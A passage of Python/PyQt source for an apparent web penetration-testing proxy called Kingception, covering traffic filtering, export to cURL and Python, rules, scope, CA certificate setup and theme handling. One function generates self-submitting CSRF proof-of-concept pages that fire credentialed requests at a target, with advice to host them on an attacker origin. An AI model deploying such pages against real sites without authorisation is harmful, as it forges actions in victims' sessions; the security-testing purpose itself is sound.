        item.setText(1, msg.get('method', ''))
        host   = msg.get('host', '')
        url    = msg.get('url', '')
        status = msg.get('status', 0)
        ct     = msg.get('content_type', '')
        item.setText(2, host)
        # Col 3 = path only (not full URL — keeps table narrow)
        item.setText(3, msg.get('path', url)[:120])
        item.setText(4, str(status))
        item.setText(5, pretty_size(msg.get('resp_size', 0)))
        item.setText(6, f"{msg.get('dur', 0):.2f}s")
        item.setText(7, ct[:40])
        item.setForeground(1, QBrush(QColor(method_color(msg.get('method', '')))))
        item.setForeground(4, QBrush(QColor(status_color(status))))
        item.setData(0, Qt.ItemDataRole.UserRole, msg['id'])
        self.proxy_tree.addTopLevelItem(item)
        if self._autoscroll:
            self.proxy_tree.scrollToBottom()
        self._apply_filter(item)
        # Update traffic counter label
        if hasattr(self, '_traffic_count_lbl'):
            self._traffic_count_lbl.setText(f"{n} requests")

    def _apply_filter(self, item):
        mf = self.f_method.currentText()
        sf = self.f_status.currentText()
        qf = self.search_box.text().lower()
        hf = self._host_filter
        m = item.text(1)
        sc = item.text(4)
        url = item.text(3).lower()
        host = item.text(2)
        show = True
        if mf != "All" and m != mf:
            show = False
        if show and sf != "All":
            try:
                lo = int(sf[0]) * 100
                show = (lo <= int(sc) < lo + 100)
            except Exception:
                pass
        if show and qf and qf not in url and qf not in host.lower():
            show = False
        if show and hf and hf not in host:
            show = False
        item.setHidden(not show)

    def _filter_proxy_tree(self):
        for i in range(self.proxy_tree.topLevelItemCount()):
            self._apply_filter(self.proxy_tree.topLevelItem(i))

    def _on_tree_click(self, item, col):
        mid = item.data(0, Qt.ItemDataRole.UserRole)
        msg = self.db.get_msg(mid)
        if not msg:
            return
        rh = safe_json(msg.get('req_headers', '{}'))
        req = f"{msg['method']} {msg['path']} HTTP/1.1\n"
        for k, v in rh.items():
            req += f"{k}: {v}\n"
        rb = msg.get('req_body')
        if rb:
            req += "\n" + decode_body(rb)
        self.req_view.setPlainText(req)
        sh = safe_json(msg.get('resp_headers', '{}'))
        resp = f"HTTP/1.1 {msg.get('status', 0)}\n"
        for k, v in sh.items():
            resp += f"{k}: {v}\n"
        rsb = msg.get('resp_body')
        if rsb:
            resp += "\n" + decode_body(rsb)[:60000]
        self.resp_view.setPlainText(resp)

    def _proxy_ctx(self, pos):
        item = self.proxy_tree.itemAt(pos)
        if not item:
            return
        mid = item.data(0, Qt.ItemDataRole.UserRole)
        msg = self.db.get_msg(mid)
        if not msg:
            return
        menu = QMenu()

        # --- Send to tools ---
        send_menu = menu.addMenu("📤 Send To")
        a_rep  = send_menu.addAction("🔁 Repeater")
        a_int  = send_menu.addAction("💣 Intruder")
        a_scan = send_menu.addAction("🔍 Scanner")
        menu.addSeparator()

        # --- Request manipulation ---
        a_method = menu.addAction("🔄 Change Request Method")
        a_edit   = menu.addAction("✏ Edit & Replay in Repeater")
        menu.addSeparator()

        # --- Copy actions ---
        copy_menu = menu.addMenu("📋 Copy")
        a_url    = copy_menu.addAction("Copy URL")
        a_curl   = copy_menu.addAction("Copy as cURL")
        a_req    = copy_menu.addAction("Copy Request (raw)")
        a_resp   = copy_menu.addAction("Copy Response (raw)")
        a_python = copy_menu.addAction("Copy as Python requests")
        menu.addSeparator()

        # --- Highlight / color ---
        hl_menu = menu.addMenu("🎨 Highlight")
        hl_colors = [
            ("🔴 Red",    "#ef4444"),
            ("🟠 Orange", "#f97316"),
            ("🟡 Yellow", "#eab308"),
            ("🟢 Green",  "#22c55e"),
            ("🔵 Blue",   "#3b82f6"),
            ("🟣 Purple", "#a855f7"),
            ("⬜ None",   ""),
        ]
        hl_actions = {}
        for label, color in hl_colors:
            hl_actions[hl_menu.addAction(label)] = color
        menu.addSeparator()

        # --- Scope / note ---
        a_scope_add = menu.addAction("✅ Add to Scope")
        a_scope_del = menu.addAction("❌ Remove from Scope")
        a_note      = menu.addAction("📝 Add / Edit Note")
        menu.addSeparator()

        # --- Save / open ---
        a_save = menu.addAction("💾 Save Item to File")
        a_open = menu.addAction("🌐 Open URL in Browser")
        a_del  = menu.addAction("🗑 Delete")

        action = menu.exec(self.proxy_tree.viewport().mapToGlobal(pos))
        if not action:
            return

        if action == a_rep:
            self._send_to_rep(msg)
        elif action == a_int:
            self._send_to_int(msg)
        elif action == a_scan:
            self.scan_url.setText(msg["url"])
            self.tabs.setCurrentIndex(4)
        elif action == a_method:
            methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
            cur = msg.get("method", "GET")
            cur_idx = methods.index(cur) if cur in methods else 0
            new_method, ok = QInputDialog.getItem(self, "Change Method",
                                                   "Select new HTTP method:", methods, cur_idx, False)
            if ok and new_method:
                msg2 = dict(msg)
                msg2["method"] = new_method
                self._send_to_rep(msg2)
                self._log(f"Changed method to {new_method} → sent to Repeater")
        elif action == a_edit:
            self._send_to_rep(msg)
        elif action == a_url:
            QApplication.clipboard().setText(msg["url"])
        elif action == a_curl:
            QApplication.clipboard().setText(self._to_curl(msg))
            self._log("cURL copied to clipboard")
        elif action == a_req:
            rh = safe_json(msg.get("req_headers", "{}"))
            raw = f"{msg['method']} {msg.get('path','/')} HTTP/1.1\n"
            for k, v in rh.items():
                raw += f"{k}: {v}\n"
            rb = msg.get("req_body")
            if rb:
                raw += "\n" + decode_body(rb)
            QApplication.clipboard().setText(raw)
            self._log("Request copied")
        elif action == a_resp:
            sh = safe_json(msg.get("resp_headers", "{}"))
            raw = f"HTTP/1.1 {msg.get('status', 0)}\n"
            for k, v in sh.items():
                raw += f"{k}: {v}\n"
            rsb = msg.get("resp_body")
            if rsb:
                raw += "\n" + decode_body(rsb)[:60000]
            QApplication.clipboard().setText(raw)
            self._log("Response copied")
        elif action == a_python:
            rh = safe_json(msg.get("req_headers", "{}"))
            h_repr = repr({k: v for k, v in rh.items() if k.lower() not in ("content-length",)})
            rb = msg.get("req_body")
            body_repr = repr(decode_body(rb)) if rb else "None"
            code = (
                "import requests\n\n"
                f"url = {repr(msg['url'])}\n"
                f"headers = {h_repr}\n"
                f"data = {body_repr}\n\n"
                f"response = requests.{msg.get('method','GET').lower()}(\n"
                "    url, headers=headers,"
                + (" data=data," if rb else "")
                + " verify=False\n)\nprint(response.status_code, response.text[:500])\n"
            )
            QApplication.clipboard().setText(code)
            self._log("Python snippet copied")
        elif action in hl_actions:
            color = hl_actions[action]
            self._msg_colors[mid] = color
            if color:
                for col in range(self.proxy_tree.columnCount()):
                    item.setBackground(col, QBrush(QColor(color + "33")))
            else:
                for col in range(self.proxy_tree.columnCount()):
                    item.setBackground(col, QBrush())
        elif action == a_scope_add:
            host = msg.get("host", "")
            lines = self.scope_edit.toPlainText().strip().split("\n")
            if host and host not in lines:
                lines.append(host)
                self.scope_edit.setPlainText("\n".join(lines))
                self._save_scope()
                self._log(f"Added to scope: {host}")
        elif action == a_scope_del:
            host = msg.get("host", "")
            lines = [l for l in self.scope_edit.toPlainText().split("\n") if host not in l]
            self.scope_edit.setPlainText("\n".join(lines))
            self._save_scope()
            self._log(f"Removed from scope: {host}")
        elif action == a_note:
            current = self._msg_notes.get(mid, "")
            note, ok = QInputDialog.getMultiLineText(self, "Note", "Add a note for this request:", current)
            if ok:
                self._msg_notes[mid] = note
                if note:
                    item.setToolTip(0, f"📝 {note}")
                self._log(f"Note saved for {msg.get('url','')[:60]}")
        elif action == a_save:
            path, _ = QFileDialog.getSaveFileName(self, "Save Item", f"request_{mid[:8]}.txt", "Text (*.txt)")
            if path:
                rh = safe_json(msg.get("req_headers", "{}"))
                raw = f"=== REQUEST ===\n{msg['method']} {msg.get('path','/')} HTTP/1.1\n"
                for k, v in rh.items():
                    raw += f"{k}: {v}\n"
                rb = msg.get("req_body")
                if rb:
                    raw += "\n" + decode_body(rb)
                raw += "\n\n=== RESPONSE ===\n"
                sh = safe_json(msg.get("resp_headers", "{}"))
                raw += f"HTTP/1.1 {msg.get('status', 0)}\n"
                for k, v in sh.items():
                    raw += f"{k}: {v}\n"
                rsb = msg.get("resp_body")
                if rsb:
                    raw += "\n" + decode_body(rsb)[:60000]
                with open(path, "w", encoding="utf-8") as f:
                    f.write(raw)
                self._log(f"Saved: {path}")
        elif action == a_open:
            webbrowser.open(msg.get("url", ""))
        elif action == a_del:
            self.proxy_tree.takeTopLevelItem(self.proxy_tree.indexOfTopLevelItem(item))

    def _send_to_rep(self, msg: dict):
        rh = safe_json(msg.get('req_headers', '{}'))
        # Build a proper raw HTTP request string — same format as what a browser sends
        method  = msg.get('method', 'GET')
        url     = msg.get('url', '')
        body    = decode_body(msg.get('req_body', '')) or ''
        path    = msg.get('path', '/')
        if not path:
            from urllib.parse import urlparse as _up
            _p = _up(url)
            path = (_p.path or '/') + (('?' + _p.query) if _p.query else '')
        raw_lines = [f"{method} {path} HTTP/1.1"]
        for k, v in rh.items():
            if k.lower() not in ('content-length', 'transfer-encoding'):
                raw_lines.append(f"{k}: {v}")
        if body:
            raw_lines.append(f"Content-Length: {len(body.encode('utf-8'))}")
        raw_lines.append("")   # blank line
        raw_lines.append(body)
        raw_request = '\n'.join(raw_lines)
        self._add_rep_tab(
            title=url[8:].split('/')[0][:26] if '://' in url else url[:26],
            method=method,
            url=url,
            raw_request=raw_request
        )
        self.tabs.setCurrentIndex(2)

    def _send_to_int(self, msg: dict):
        rh = safe_json(msg.get('req_headers', '{}'))
        h_text = "\n".join(f"{k}: {v}" for k, v in rh.items() if k.lower() != 'content-length')
        self.intr_url.setText(msg['url'])
        self.intr_method.setCurrentText(msg['method'])
        self.intr_headers.setPlainText(h_text)
        self.intr_body.setPlainText(decode_body(msg.get('req_body', '')) or '{"key":"§PAYLOAD§"}')
        self.tabs.setCurrentIndex(3)
        self._log("Sent to Intruder. Mark injection point with §PAYLOAD§ then Start Attack.")

    def _send_to_sequencer(self, url: str, raw_request: str):
        """Quick-send current Repeater request to Sequencer for token analysis."""
        hds, bdy = self._parse_raw_request(raw_request)
        # Try to find a token parameter automatically
        token_param = ""
        auth = hds.get('Authorization', '')
        if 'Bearer ' in auth:
            token_param = 'Bearer'
        else:
            # Look for common token param names in body/query
            body_str = (bdy or b'').decode('utf-8', 'replace')
            for cand in ['token', 'session', 'csrf', 'jwt']:
                if cand in body_str.lower() or cand in url.lower():
                    token_param = cand
                    break
        param, ok = QInputDialog.getText(self, "Sequencer", "Parameter / pattern to extract:", text=token_param)
        if not ok:
            return
        # Lazy-load the Sequencer tab if it hasn't been built yet, via the
        # same on-demand mechanism the tab bar itself uses when clicked —
        # this guarantees self.seq_url / self.seq_param etc. exist below.
        self._lazy_load_tab(self._TAB_SEQUENCER)
        # Carry method/headers/body across too (mirrors "Send to Intruder"
        # above) so a live capture replays the exact request Repeater had —
        # auth cookies and all — not just the bare URL.
        req_line = raw_request.replace('\r\n', '\n').split('\n', 1)[0].split(' ')
        method = req_line[0].upper() if req_line and req_line[0] else 'GET'
        if method in ["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"]:
            self.seq_method.setCurrentText(method)
        self.seq_headers.setPlainText(
            "\n".join(f"{k}: {v}" for k, v in hds.items()
                      if k.lower() not in ('host', 'content-length')))
        self.seq_body.setPlainText((bdy or b'').decode('utf-8', 'replace'))
        self.seq_url.setText(url)
        self.seq_param.setText(param)
        self.tabs.setCurrentIndex(self._TAB_SEQUENCER)
        self._log(f"[Repeater] Sent to Sequencer: {url} (param: {param})")

    def _to_curl(self, msg: dict) -> str:
        import shlex
        h = safe_json(msg.get('req_headers', '{}'))
        parts = [f"curl -X {msg['method']} {shlex.quote(msg['url'])}"]
        for k, v in h.items():
            if k.lower() != 'content-length':
                parts.append(f"  -H {shlex.quote(f'{k}: {v}')}")
        body = msg.get('req_body')
        if body:
            parts.append(f"  -d {shlex.quote(decode_body(body))}")
        parts.append("  -k")
        return " \\\n".join(parts)

    def _gen_csrf_poc(self, raw_request: str, full_url: str) -> str:
        """Generate a self-submitting HTML CSRF PoC from a raw HTTP request.

        Supports:
        - application/x-www-form-urlencoded  → <form> with hidden inputs + auto-submit
        - multipart/form-data                → <form enctype=multipart/form-data>
        - application/json                   → fetch() with JSON body + credentials:include
        - GET with query params              → hidden iframe auto-navigation
        - Everything else                    → fetch() with raw body
        """
        headers, body_bytes = self._parse_raw_request(raw_request)
        lines = raw_request.split('\n')
        req_parts = lines[0].split(' ') if lines else ['GET','/',  'HTTP/1.1']
        method = req_parts[0].upper() if req_parts else 'GET'
        ct = headers.get('Content-Type', headers.get('content-type', '')).lower().split(';')[0].strip()
        body_str = (body_bytes or b'').decode('utf-8', 'replace')
        import urllib.parse as _up

        def _esc(s):
            return (s.replace('&','&amp;').replace('"','&quot;')
                     .replace('<','&lt;').replace("'","&#39;"))

        ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M')
        safe_url = _esc(full_url)

        if method == 'GET':
            return (
                f'<!DOCTYPE html>\n<html>\n<head><meta charset="UTF-8">\n'
                f'<title>CSRF PoC (GET) — Kingception</title></head>\n<body>\n'
                f'<h2>CSRF PoC &mdash; GET</h2>\n'
                f'<p>Target: <code>{safe_url}</code></p>\n'
                f'<iframe src="{safe_url}" id="csrf_frame" style="display:none"></iframe>\n'
                f'<p><a href="{safe_url}" target="_blank">Click to trigger manually</a></p>\n'
                f'<script>document.getElementById("csrf_frame").src="{safe_url}";</script>\n'
                f'<!-- Kingception CSRF PoC  |  {ts} -->\n</body></html>'
            )

        if ct == 'application/x-www-form-urlencoded':
            pairs = _up.parse_qsl(body_str, keep_blank_values=True)
            inputs = '\n'.join(
                f'  <input type="hidden" name="{_esc(k)}" value="{_esc(v)}">'
                for k, v in pairs)
            return (
                f'<!DOCTYPE html>\n<html>\n<head><meta charset="UTF-8">\n'
                f'<title>CSRF PoC — Kingception</title></head>\n<body>\n'
                f'<h2>CSRF PoC &mdash; {method} form</h2>\n'
                f'<p>Target: <code>{safe_url}</code></p>\n'
                f'<form id="csrf_form" action="{safe_url}" method="{method}">\n'
                f'{inputs}\n'
                f'  <input type="submit" value="Submit Request">\n'
                f'</form>\n'
                f'<script>document.getElementById("csrf_form").submit();</script>\n'
                f'<!-- Kingception CSRF PoC  |  {ts} -->\n</body></html>'
            )

        if ct == 'multipart/form-data':
            return (
                f'<!DOCTYPE html>\n<html>\n<head><meta charset="UTF-8">\n'
                f'<title>CSRF PoC (multipart) — Kingception</title></head>\n<body>\n'
                f'<h2>CSRF PoC &mdash; multipart/form-data</h2>\n'
                f'<p>Target: <code>{safe_url}</code></p>\n'
                f'<form id="csrf_form" action="{safe_url}" method="{method}" enctype="multipart/form-data">\n'
                f'  <!-- Add hidden inputs or file inputs as needed -->\n'
                f'  <input type="submit" value="Submit">\n'
                f'</form>\n'
                f'<script>document.getElementById("csrf_form").submit();</script>\n'
                f'<!-- Kingception CSRF PoC  |  {ts} -->\n</body></html>'
            )

        if ct == 'application/json':
            safe_body = body_str.replace('`','\\`').replace('${','\\${')
            return (
                f'<!DOCTYPE html>\n<html>\n<head><meta charset="UTF-8">\n'
                f'<title>CSRF PoC (JSON fetch) — Kingception</title></head>\n<body>\n'
                f'<h2>CSRF PoC &mdash; JSON fetch()</h2>\n'
                f'<p>Target: <code>{safe_url}</code> &nbsp;|&nbsp; {method}</p>\n'
                f'<p id="status">Sending&hellip;</p>\n'
                f'<script>\n'
                f'fetch("{safe_url}", {{\n'
                f'  method: "{method}",\n'
                f'  credentials: "include",\n'
                f'  headers: {{"Content-Type":"application/json"}},\n'
                f'  body: `{safe_body}`\n'
                f'}})\n'
                f'.then(r => document.getElementById("status").textContent = "Response: " + r.status)\n'
                f'.catch(e => document.getElementById("status").textContent = "Error: " + e);\n'
                f'</script>\n'
                f'<!-- Kingception CSRF PoC  |  {ts} -->\n</body></html>'
            )

        # Fallback: generic fetch() for any other content-type
        safe_body = body_str.replace('`','\\`').replace('${','\\${')
        return (
            f'<!DOCTYPE html>\n<html>\n<head><meta charset="UTF-8">\n'
            f'<title>CSRF PoC — Kingception</title></head>\n<body>\n'
            f'<h2>CSRF PoC &mdash; {method} fetch()</h2>\n'
            f'<p>Target: <code>{safe_url}</code></p>\n'
            f'<p id="status">Sending&hellip;</p>\n'
            f'<script>\n'
            f'fetch("{safe_url}", {{\n'
            f'  method: "{method}",\n'
            f'  credentials: "include",\n'
            f'  headers: {{"Content-Type":"{ct or "text/plain"}"}},\n'
            f'  body: `{safe_body}`\n'
            f'}})\n'
            f'.then(r => document.getElementById("status").textContent = "Response: " + r.status)\n'
            f'.catch(e => document.getElementById("status").textContent = "Error: " + e);\n'
            f'</script>\n'
            f'<!-- Kingception CSRF PoC  |  {ts} -->\n</body></html>'
        )

    def _show_csrf_poc_dialog(self, html: str):
        """Show the generated CSRF PoC in a dialog with copy / save / open controls."""
        dlg = QDialog(self)
        dlg.setWindowTitle("🛡 CSRF PoC — Kingception")
        dlg.resize(780, 540)
        dlg.setStyleSheet(
            f"QDialog{{background:{T.BG};color:{T.TXT1};}}"
            f"QPushButton{{background:{T.SURFACE};color:{T.TXT2};"
            f"border:1px solid {T.BORDER};border-radius:6px;"
            f"padding:4px 14px;font-size:12px;}}"
            f"QPushButton:hover{{border-color:{T.BLUE};}}")
        dv = QVBoxLayout(dlg); dv.setSpacing(8); dv.setContentsMargins(12,12,12,12)

        info = QLabel(
            "⚠ <b>Review before use.</b>  This PoC auto-submits when opened in a browser. "
            "Host on an attacker-controlled origin to test same-origin policy enforcement.")
        info.setWordWrap(True)
        info.setOpenExternalLinks(False)
        info.setStyleSheet(f"color:{T.YELLOW};font-size:11px;padding:4px 0;")
        dv.addWidget(info)

        editor = QPlainTextEdit()
        editor.setPlainText(html)
        editor.setFont(mono_font(10))
        editor.setStyleSheet(
            f"background:{T.PANEL};color:{T.CODE};"
            f"border:1px solid {T.BORDER};border-radius:6px;"
            f"padding:8px;font-family:{T.MONO};")
        HTTPHighlighter(editor.document())
        dv.addWidget(editor, 1)

        bb = QHBoxLayout(); bb.setSpacing(6)
        btn_copy  = QPushButton("📋 Copy HTML")
        btn_save  = QPushButton("💾 Save .html")
        btn_open  = QPushButton("🌐 Open in Browser")
        btn_close = QPushButton("Close")

        def _copy():
            QApplication.clipboard().setText(editor.toPlainText())
            btn_copy.setText("✅ Copied!")
            QTimer.singleShot(1500, lambda: btn_copy.setText("📋 Copy HTML"))

        def _save():
            path, _ = QFileDialog.getSaveFileName(
                dlg, "Save CSRF PoC", "csrf_poc.html", "HTML (*.html)")
            if path:
                open(path,'w',encoding='utf-8').write(editor.toPlainText())
                self._log(f"CSRF PoC saved → {path}")

        def _open_browser():
            import tempfile
            tf = tempfile.NamedTemporaryFile(
                suffix='.html', delete=False, mode='w', encoding='utf-8')
            tf.write(editor.toPlainText()); tf.close()
            webbrowser.open(f"file://{tf.name}")
            self._log("CSRF PoC opened in browser")

        btn_copy.clicked.connect(_copy)
        btn_save.clicked.connect(_save)
        btn_open.clicked.connect(_open_browser)
        btn_close.clicked.connect(dlg.accept)
        for b in (btn_copy, btn_save, btn_open, btn_close):
            b.setFixedHeight(30); bb.addWidget(b)
        bb.insertStretch(3)
        dv.addLayout(bb)
        dlg.exec()

    # ---------- CA, Rules, Scope ----------
    def _gen_ca(self):
        if not HAS_CRYPTO:
            QMessageBox.critical(self, "Missing dependency",
                "Install the cryptography package first:\n\n  pip install cryptography")
            return
        try:
            crt, key = self.proxy.certs.generate_ca()
            self.ca_lbl.setText(f"✅ {crt}")
            self.ca_lbl.setStyleSheet(f"color:{T.GREEN}")
            QMessageBox.information(self, "✅ Kingception CA Generated",
                f"Certificate saved to:\n  {crt}\n\n"
                f"Private key (keep secret):\n  {key}\n\n"
                "── NEXT STEPS ──────────────────────────────────\n"
                "Firefox:\n"
                "  Settings → Privacy → Certificates → View Certificates\n"
                "  Authorities → Import → select the .crt file above\n"
                "  ☑ Trust to identify websites → OK\n\n"
                "Chrome/Chromium:\n"
                "  Settings → Privacy → Security → Manage certificates\n"
                "  Authorities → Import → select the .crt file above\n\n"
                "Kali system-wide:\n"
                "  sudo cp <path> /usr/local/share/ca-certificates/kingception-ca.crt\n"
                "  sudo update-ca-certificates\n\n"
                "Restart browser after importing!")
            self._log(f"CA cert generated: {crt}")
        except Exception as e:
            QMessageBox.critical(self, "Error generating CA", str(e))

    def _add_rule(self):
        @dataclass
        class MRule:
            id: str; name: str; pattern: str; replace: str
            apply_to: str; scope: str; enabled: bool; is_regex: bool
        d = QDialog(self)
        d.setWindowTitle("Add Rule")
        d.resize(500, 320)
        fl = QFormLayout(d)
        fl.setContentsMargins(16, 16, 16, 16)
        name = QLineEdit()
        fl.addRow("Name:", name)
        patt = QLineEdit()
        fl.addRow("Pattern:", patt)
        repl = QLineEdit()
        fl.addRow("Replace with:", repl)
        at = QComboBox()
        at.addItems(["both", "request", "response"])
        fl.addRow("Apply to:", at)
        sc = QComboBox()
        sc.addItems(["body", "headers", "both"])
        fl.addRow("Scope:", sc)
        rx = QCheckBox("Use Regex")
        fl.addRow("", rx)
        btns = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        btns.accepted.connect(d.accept)
        btns.rejected.connect(d.reject)
        fl.addRow(btns)
        if d.exec() == QDialog.DialogCode.Accepted:
            rule = MRule(str(uuid.uuid4()), name.text(), patt.text(), repl.text(),
                         at.currentText(), sc.currentText(), True, rx.isChecked())
            self.proxy.rules.append(rule)
            self.db.save_rule(rule)
            self._refresh_rules()
            self._log(f"Rule added: {rule.name}")

    def _del_rule(self):
        row = self.rules_tbl.currentRow()
        if row < 0:
            return
        if row < len(self.proxy.rules):
            self.proxy.rules.pop(row)
        self.rules_tbl.removeRow(row)

    def _refresh_rules(self):
        if not hasattr(self, 'rules_tbl'):
            return
        self.rules_tbl.setRowCount(0)
        for r in self.proxy.rules:
            row = self.rules_tbl.rowCount()
            self.rules_tbl.insertRow(row)
            for c, val in enumerate([r.name, r.pattern, r.replace, r.apply_to, r.scope,
                                     "✓" if r.is_regex else "✗"]):
                self.rules_tbl.setItem(row, c, QTableWidgetItem(val))

    def _save_scope(self):
        @dataclass
        class SRule:
            id: str; pattern: str; rule_type: str; enabled: bool
        self.proxy.scope.clear()
        for line in self.scope_edit.toPlainText().strip().split('\n'):
            line = line.strip()
            if not line:
                continue
            exc = line.startswith('!')
            self.proxy.scope.append(SRule(str(uuid.uuid4()), line[1:] if exc else line,
                                          'exclude' if exc else 'include', True))
        self._log(f"Scope: {len(self.proxy.scope)} rules")

    # =========================================================
    # CORE UTILITY METHODS — _btn, _log, _clear, stats, theme
    # =========================================================

    def _btn(self, label: str, style: str = None, h: int = 28, w: int = None) -> QPushButton:
        """Factory for consistently styled buttons. Primary actions get a
        direct (non-cascaded) stylesheet — see primary_btn_css() — plus a
        soft colored glow (QGraphicsDropShadowEffect; Qt stylesheets can't
        do box-shadow, so this is a real Qt graphics effect instead)."""
        b = QPushButton(label)
        b.setFixedHeight(h)
        if w:
            b.setFixedWidth(w)
        if style in ("primary", "purple"):
            b.setStyleSheet(primary_btn_css(style))
        elif style:
            b.setObjectName(style)
        if style in ("primary", "purple"):
            glow = QGraphicsDropShadowEffect(b)
            glow.setBlurRadius(18)
            glow.setOffset(0, 0)
            glow_color = QColor(T.PURPLE if style == "purple" else T.BLUE)
            glow_color.setAlpha(140)
            glow.setColor(glow_color)
            b.setGraphicsEffect(glow)
        return b

    def _log(self, msg: str):
        """Append a timestamped message to the status bar and the Settings ▸
        Console Log panel (self.log_box)."""
        import datetime as _dt
        ts = _dt.datetime.now().strftime('%H:%M:%S')
        line = f"[{ts}]  {msg}"
        # Status bar
        if hasattr(self, 'statusBar'):
            try:
                self.statusBar().showMessage(line, 8000)
            except Exception:
                pass
        # Console Log panel (Settings tab)
        if hasattr(self, 'log_box'):
            try:
                self.log_box.appendPlainText(line)
            except Exception:
                pass

    def _set_proxy_status(self, text: str, color: str = None):
        """Update the permanent 'proxy running' indicator in the status bar.
        Unlike _log()'s transient 8-second message, this label previously
        never changed after being set once at startup — so a bind failure
        (port in use, permission denied, etc.) still showed a permanent,
        misleadingly reassuring '● Proxy running' with no visual change."""
        if not hasattr(self, 's_status'):
            return
        color = color or T.GREEN
        try:
            self.s_status.setText(f"● {text}")
            self.s_status.setStyleSheet(
                f"color:{color};padding:0 10px;font-size:11px;font-weight:600;")
        except Exception:
            pass

    def _on_proxy_started(self, port: int):
        self._log(f"Proxy started on 127.0.0.1:{port}")
        self._set_proxy_status(f"Proxy running on 127.0.0.1:{port}", T.GREEN)

    def _on_proxy_err(self, err: str):
        self._log(f"[ERR] {err}")
        self._set_proxy_status(f"Proxy error: {err}", T.RED)

    def _clear(self):
        """Clear the traffic history tree and in-memory recent list."""
        self.proxy_tree.clear()
        self.db.recent.clear()
        if hasattr(self, '_traffic_count_lbl'):
            self._traffic_count_lbl.setText("0 requests")
        self.req_view.clear()
        self.resp_view.clear()
        self._log("Traffic history cleared")

    def _quick_export(self):
        """Quick export traffic to CSV."""
        path, _ = QFileDialog.getSaveFileName(
            self, "Export Traffic", "kingception_traffic.csv",
            "CSV (*.csv);;All (*.*)")
        if not path:
            return
        import csv as _csv
        msgs = list(self.db.recent)
        with open(path, 'w', newline='', encoding='utf-8') as f:
            w = _csv.writer(f)
            w.writerow(["#", "Method", "Host", "Path", "Status",
                        "Size", "Duration", "Content-Type", "URL"])
            for i, m in enumerate(msgs, 1):
                w.writerow([
                    i,
                    m.get('method', ''),
                    m.get('host', ''),
                    m.get('path', ''),
                    m.get('status', ''),
                    m.get('resp_size', 0),
                    round(m.get('dur', 0), 3),
                    m.get('content_type', ''),
                    m.get('url', ''),
                ])
        self._log(f"Exported {len(msgs)} rows → {path}")

    def _update_stats(self):
        """Called every second — update proxy status bar."""
        if not hasattr(self, 'proxy') or not self.proxy:
            return
        n     = self.proxy_tree.topLevelItemCount()
        ic_on = self.intercept.enabled
        try:
            self.statusBar().showMessage(
                f"  Proxy: 127.0.0.1:8080  |  {n} requests  |  "
                f"Intercept: {'ON' if ic_on else 'OFF'}")
        except Exception:
            pass

    def _toggle_theme(self):
        """Toggle between dark and light theme.

        A bare QApplication.setStyleSheet() call is NOT enough here: most tabs
        build their own widget-level stylesheets as f-strings baked from T at
        construction time (e.g. `panel.setStyleSheet(f"background:{T.PANEL}")`),
        which take priority over the global QSS and never re-evaluate T after
        the fact. The only reliable fix is to actually rebuild the tab tree
        with the new T/CSS in effect, which is what _rebuild_ui_for_theme()
        does — preserving traffic history, scope, and intercept state across
        the rebuild.
        """
        global T, CSS, _DARK_MODE
        _DARK_MODE = not _DARK_MODE
        T = _ThemeDark() if _DARK_MODE else _ThemeLight()
        CSS = _make_css()
        self._rebuild_ui_for_theme()
        self._log(f"Theme: {'dark' if _DARK_MODE else 'light'}")

    def _rebuild_ui_for_theme(self):
        """Tear down and reconstruct the toolbar + tab tree so every widget is
        built fresh against the current (just-toggled) T/CSS. Backend objects
        (self.proxy, self.db, self.intercept, self.scope, self.sessions) are
        never touched — only the widget tree is rebuilt — so in-flight proxy
        connections and captured history both survive untouched. Repeater
        tabs, Decoder input/output, Intruder's request setup, and Scanner's
        target/findings are explicitly snapshotted beforehand and restored
        afterward, since all of that otherwise lives only in the widget tree
        that's being torn down — toggling the theme was silently discarding
        whatever you were working on in any of these tabs."""
        prev_tab_index    = self.tabs.currentIndex() if hasattr(self, 'tabs') else 0
        prev_scope_text   = self.scope_edit.toPlainText() if hasattr(self, 'scope_edit') else ""
        prev_intercept_on = self.intercept.enabled
        pending_items     = list(self.intercept._pending.values())

        # Decoder: just two text fields + the selected codec.
        dec_state = None
        if hasattr(self, 'dec_in'):
            dec_state = (self.dec_in.toPlainText(), self.dec_type.currentText(),
                         self.dec_out.toPlainText())

        # Intruder: the request-crafting setup (mode/method/URL + marked
        # headers/body). Configured payload sets are not round-tripped —
        # a bounded compromise given how much nested state those carry —
        # but the much more common case (mid-setup request + markers) is.
        intr_state = None
        if hasattr(self, 'intr_url'):
            intr_state = (self.intr_mode.currentText(), self.intr_method.currentText(),
                          self.intr_url.text(), self.intr_headers.toPlainText(),
                          self.intr_body.toPlainText())

        # Scanner: target/mode config + every finding collected so far —
        # self._scan_findings is a plain list so the *data* would already
        # survive, but _scanner_tab() unconditionally resets it to [] on
        # every rebuild and the results tree is recreated empty regardless,
        # so without this a rebuild silently threw away a completed scan.
        scan_state = None
        if hasattr(self, 'scan_url'):
            scan_state = (self.scan_url.text(), self.scan_mode.currentText(),
                          list(getattr(self, '_scan_findings', [])))

        # Repeater tabs live only in the widget tree that's about to be torn
        # down — without this, EVERY open tab (and whatever request you were
        # crafting in it) is silently wiped out just from toggling the theme.
        saved_rep_tabs = []
        prev_rep_index = 0
        if hasattr(self, 'rep_tabs'):
            prev_rep_index = self.rep_tabs.currentIndex()
            for i in range(self.rep_tabs.count()):
                tab_w = self.rep_tabs.widget(i)
                editor = tab_w.findChild(QPlainTextEdit, "kc_req_editor")
                target = tab_w.findChild(QLineEdit, "kc_target_edit")
                if editor is not None:
                    saved_rep_tabs.append({
                        "title": self.rep_tabs.tabText(i),
                        "raw": editor.toPlainText(),
                        "url": target.text() if target is not None else "",
                    })

        if hasattr(self, 'main_toolbar'):
            self.removeToolBar(self.main_toolbar)
        old_central = self.centralWidget()
        if old_central:
            old_central.setParent(None)
            old_central.deleteLater()

        self.setStyleSheet(CSS)
        QApplication.instance().setStyleSheet(CSS)
        self._update_window_title()
        self._build_ui()
        self._connect_widget_signals()   # backend signals were already connected once — never re-run those

        # Restore state that lived only in the (now-rebuilt) widgets
        if hasattr(self, 'scope_edit') and prev_scope_text:
            self.scope_edit.setPlainText(prev_scope_text)
            self._save_scope()
        self._refresh_rules()
        for pi in pending_items:
            self._ic_queue_add(pi)
        for m in reversed(list(self.db.recent)):
